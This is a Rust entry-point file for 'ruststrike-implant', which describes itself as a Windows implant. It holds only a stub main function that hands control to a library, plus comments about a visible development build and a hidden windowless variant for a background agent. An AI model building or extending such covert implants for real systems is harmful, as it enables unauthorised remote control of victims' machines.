//! ruststrike-implant: console-subsystem Windows implant.
//!
//! Shows a console window on launch (used for development so the `[implant]`
//! logs are visible with `--features verbose`). For a hidden/background agent
//! use the `ruststrike-implant-silent` bin (GUI subsystem, no window) instead.
//!
//! All logic lives in the `ruststrike_implant` lib; this is a thin entry point.

fn main() -> anyhow::Result<()> {
    ruststrike_implant::run()
}
